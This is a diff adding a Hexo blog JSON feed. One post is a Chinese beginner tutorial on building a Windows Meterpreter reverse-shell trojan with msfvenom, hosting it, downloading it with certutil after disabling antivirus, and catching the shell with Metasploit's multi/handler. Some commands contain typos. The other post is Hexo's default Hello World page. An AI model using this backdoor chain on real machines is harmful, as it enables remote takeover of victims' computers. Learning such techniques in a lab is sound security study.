@@ -1,0 +1,24 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "YZJ的博客",
+    "description": "",
+    "home_page_url": "http://example.com",
+    "items": [
+        {
+            "id": "http://example.com/2024/04/02/%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E6%88%90%E6%9E%9C/",
+            "url": "http://example.com/2024/04/02/%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E6%88%90%E6%9E%9C/",
+            "title": "",
+            "date_published": "2024-04-02T09:56:44.855Z",
+            "content_html": "<p>title: 寒假学习成果<br>date: 2024-04-02 17:56:44<br>tags:没有</p>\n<h1 id=\"这篇文章用来记录24年寒假的学习成果。\"><a href=\"#这篇文章用来记录24年寒假的学习成果。\" class=\"headerlink\" title=\"这篇文章用来记录24年寒假的学习成果。\"></a>这篇文章用来记录24年寒假的学习成果。</h1><p>　24年寒假我通过b站大学学了一点东西——如何利用kali生成一个简单的远程木马后门。</p>\n<p>　<strong>声明：本文章仅用于学习，严禁用于非法途径，若读者因此做出任何危害网络安全的行为后果自负，与本篇文章的作者无关。</strong></p>\n<p>先是安装好虚拟机环境，安装好VMware，选择好自己喜欢的kali版本安装好就能开始了。</p>\n<p>　　tips　1 需要用到kali的超级管理员权限，这里我选择使用<code>sudo su</code>指令拿到到kali的root管理员权限。</p>\n<p>注意：进入kali的root管理员需要输入kali的密码，kali的密码就是kali。</p>\n<p>　　tips　2 利用<code>ifconfig</code>查看ip地址，使用<code>ifconfig</code>之后，找到eth０后面的ip地址就行。</p>\n<p>　　tips　3 使用<code>msfvenom -p windows/x64/meterpreter／reverse_tcp lhost=这里写ip地址 lport=（端口0-65535随便写） -f exe -o test(名称可以自定义).exe</code></p>\n<p>注意：远程木马后门生成需要一点时间需要等待，这里我生成的是一个windows系统（64位）的远程木马后门病毒。</p>\n<p>　　tips 4 利用kali中安装好的Python3工具快速开启一个端口，<code>python3 -m http.server 10086(这里是端口号可以随便写0-65535中的任意一个数字)</code></p>\n<p>　　到这里一个简单（wei）的远程木马后门已经完成生成，再往下就可以选择使用多种方法将制作好的木马病毒丢给受害者的机器。</p>\n<p>　这里为方便测试我选择在我自己的电脑终端获得管理员权限之后使用命令来进行下载，</p>\n<p><code>ｃｅｒｔｕｔｉｌ　－ｕｒｌｃａｃｈｅ　－ｓｐｌｉｔ　－ｆ　ｈｔｔｐ：／／ｉｐ：端口／木马文件的路径</code>正常情况下这个木马肯定会被干掉的，这就需要我们先提前关闭ｗｉｎｄｏｗｓ的杀毒软件。</p>\n<p>　　现在假定我们已经完成植入，现在启动！</p>\n<p>　tips１　输入<code>ｍｓｆｃｏｎｓｌｏｅ</code>，需要等待一小会</p>\n<p>　tips２　先输入<code>ｕｓｅ　ｅｘｐｌｏｉｔ／ｍｕｌｔｉ／ｈａｎｄｌｅｒ</code></p>\n<p>　tips３　<code>ｓｅｔ　ｐａｙｌｏａｄ　ｗｉｎｄｏｗｓ／ｘ６４／ｍｅｔｅｒｐｒｅｔｅｒ／ｒｅｖｅｒｓｅ＿ｔｃｐ</code></p>\n<p>　　　　　<code>ｓｅｔ　ｉｈｏｓｔ</code></p>\n<p>　　　　　<code>ｓｅｔ　ｌｐｏｒｔ</code></p>\n<p>　tips４　最后<code>ｒｕｎ</code>，然后等待一会。</p>\n",
+            "tags": []
+        },
+        {
+            "id": "http://example.com/2023/11/18/hello-world/",
+            "url": "http://example.com/2023/11/18/hello-world/",
+            "title": "Hello World",
+            "date_published": "2023-11-18T12:13:15.754Z",
+            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
+            "tags": []
+        }
+    ]
+}
